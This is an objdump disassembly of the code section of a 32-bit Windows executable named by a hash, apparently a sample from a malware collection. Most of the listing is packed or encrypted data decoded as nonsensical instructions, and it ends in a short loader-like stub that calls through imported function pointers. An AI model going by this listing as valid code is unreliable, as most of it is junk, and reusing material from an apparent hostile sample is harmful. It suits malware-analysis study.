
930e75f4060cd8e166ea6f31cf3b254f43fd36949880baa0b11717c268e1c192.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	or     DWORD PTR ds:0xc7f38602,0x7da68c1e
  4d000a:	or     DWORD PTR [ebp+ebp*4-0x38],ebx
  4d000e:	out    0xec,al
  4d0010:	xor    eax,DWORD PTR [ebx+0x15]
  4d0013:	aas    
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0721
  4d06c1:	push   cs
  4d06c2:	je     0x4d0675
  4d06c4:	loop   0x4d0715
  4d06c6:	mov    al,fs:0x8bf51150
  4d06cc:	dec    ebp
  4d06cd:	pop    ds
  4d06ce:	sub    al,dh
  4d06d0:	pop    edi
  4d06d1:	aam    0x6d
  4d06d3:	test   BYTE PTR [esp+eiz*2+0x7f],0x87
  4d06d8:	push   edx
  4d06d9:	out    dx,eax
  4d06da:	(bad)
  4d06de:	out    0x49,eax
  4d06e0:	sub    eax,0x7ae3cdc3
  4d06e5:	push   eax
  4d06e6:	or     dh,BYTE PTR [esi-0x7e4450d2]
  4d06ec:	pop    edi
  4d06ed:	call   DWORD PTR ds:0x4d2038
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06fd:	sub    esp,0x2c
  4d0700:	lea    ebx,[esi-0x1c0]
  4d0706:	sub    eax,DWORD PTR [ebp-0x2c]
  4d0709:	push   ebx
  4d070a:	push   eax
  4d070b:	push   DWORD PTR [ebx+0x1b8]
  4d0711:	push   DWORD PTR [ebx+0x190]
  4d0717:	call   0x4d08a0
  4d071c:	add    esp,0xc
  4d071f:	pop    ebx
  4d0720:	mov    edi,0x0
  4d0725:	push   edi
  4d0726:	call   0x4d0888
  4d072b:	add    esp,0x4
  4d072e:	call   0x4d14fc
  4d0733:	add    esp,0x4
  4d0736:	add    esp,0x2c
  4d0739:	pop    ebp
  4d073a:	ret    
  4d073b:	add    BYTE PTR [edi-0x1],bl
  4d073e:	adc    eax,0x4d2064
  4d0743:	call   edi
  4d0745:	add    BYTE PTR [eax],al
  4d0747:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d074d:	sub    esp,0x38
  4d0750:	mov    eax,0x4d3028
  4d0755:	adc    DWORD PTR [eax+0x114],0x5650
  4d075f:	push   eax
  4d0760:	push   edx
  4d0761:	push   DWORD PTR [eax+0xc]
  4d0764:	call   0x4d1168
  4d0769:	add    esp,0x8
  4d076c:	pop    eax
  4d076d:	push   eax
  4d076e:	push   0x0
  4d0770:	call   0x4d115c
  4d0775:	add    esp,0x4
  4d0778:	pop    eax
  4d0779:	mov    esi,0x4d2008
  4d077e:	mov    esi,DWORD PTR [esi]
  4d0780:	push   esi
  4d0781:	push   DWORD PTR [eax+0x70]
  4d0784:	pop    edi
  4d0785:	call   edi
  4d0787:	add    esp,0x38
  4d078a:	pop    ebp
  4d078b:	ret    
  4d078c:	pop    edi
  4d078d:	call   DWORD PTR ds:0x4d2088
  4d0793:	call   edi
  4d0795:	add    BYTE PTR [eax],al
  4d0797:	add    BYTE PTR [edi-0x1],bl
  4d079a:	adc    eax,0x4d2078
  4d079f:	call   edi
  4d07a1:	add    BYTE PTR [eax],al
  4d07a3:	add    BYTE PTR [edi-0x1],bl
  4d07a6:	adc    eax,0x4d2040
  4d07ab:	call   edi
